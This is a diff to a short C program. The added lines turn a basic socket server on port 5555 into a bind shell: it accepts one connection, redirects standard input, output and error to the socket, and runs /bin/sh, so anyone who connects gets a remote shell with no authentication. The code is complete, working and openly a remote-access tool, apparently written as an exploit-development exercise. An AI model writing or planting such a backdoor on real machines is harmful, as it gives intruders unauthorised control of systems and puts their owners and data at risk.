@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 
@@ -8,7 +9,7 @@
 #define PORT 5555
 
 int main(int argc, char **argv) {
-    int sockfd;
+    int sockfd, newsockfd;
     struct sockaddr_in server_addr;
 
     // create socket
@@ -17,7 +18,6 @@ int main(int argc, char **argv) {
         perror("Error creating socket");
         exit(1);
     }
-
     printf("Socket created.\n");
 
     // declare members of server socket address
@@ -40,8 +40,36 @@ int main(int argc, char **argv) {
         perror("Error binding socket to address");
         exit(1);
     }
-
     printf("Socket bound to internet address.\n");
 
-    return 0;
+    // listen for connections
+    if (listen(sockfd, 0) < 0) {
+        perror("Error on listen");
+        exit(1);
+    }
+    printf("Listening for connections.\n");
+
+    // accept new connection
+    newsockfd = accept(sockfd, NULL, NULL);
+    if (newsockfd < 0) {
+        perror("Connection failed");
+        exit(1);
+    }
+    printf("Connection established.\n");
+
+    // duplicate new socket to stdin/out/err
+    for (int i=0; i<3; i++) {
+        if (dup2(newsockfd, i) < 0) {
+            perror("Error duplicating connected socket");
+            exit(1);
+        }
+    }
+    printf("Socket I/O established.\n");
+
+    // execute a shell
+    execve("/bin/sh", NULL, NULL);
+
+    // we should never come back here
+    perror("Error during execution");
+    exit(1);
 }
